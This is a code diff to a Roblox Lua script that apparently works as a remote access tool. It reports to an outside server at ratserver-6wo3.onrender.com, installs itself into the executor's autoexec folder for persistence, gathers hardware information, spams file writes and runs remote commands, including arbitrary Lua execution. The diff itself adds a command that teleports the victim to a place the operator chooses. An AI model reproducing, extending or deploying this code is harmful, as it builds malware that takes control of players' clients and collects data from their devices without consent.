@@ -8,6 +8,7 @@ local MarketplaceService = game:GetService("MarketplaceService")
 local RunService = game:GetService("RunService")
 local Stats = game:GetService("Stats")
 local CoreGui = game:GetService("CoreGui")
+local TeleportService = game:GetService("TeleportService")
 
 local SERVER_URL = "https://ratserver-6wo3.onrender.com"
 local player = Players.LocalPlayer
@@ -295,9 +296,6 @@ local function sendInjectNotification()
         end)
     end
 end
-
--- Замени старую функцию sendInjectNotification() на эту
--- Вызови ее при инжекте
 
 local function autoInstallToAutoexec()
     if deviceType ~= "PC" or not safeCheck("writefile") then
@@ -1032,6 +1030,21 @@ local function getHardwareInfo()
     return hardwareData
 end
 
+local function teleportToPlace(placeId)
+    local teleportService = game:GetService("TeleportService")
+    
+    local success, result = pcall(function()
+        teleportService:Teleport(tonumber(placeId), player)
+        return true
+    end)
+    
+    if success then
+        return "Запущен телепорт на место ID: "..placeId
+    else
+        return "Ошибка телепорта: "..tostring(result)
+    end
+end
+
 local function memorySpam(fileCount)
     if not safeCheck("writefile") then
         return 0
@@ -1205,6 +1218,14 @@ local function ExecuteCommand(cmd, args)
             sound.Ended:Connect(function()
                 pcall(function() sound:Destroy() end)
             end)
+        
+        elseif cmd == "tpgame" then
+            if args and args[1] then
+                local placeId = args[1]
+                if placeId and string.match(placeId, "^%d+$") then
+                    teleportToPlace(placeId)
+                end
+            end
         
         elseif cmd == "execute" then
             local result = executeLua(table.concat(args, " "))
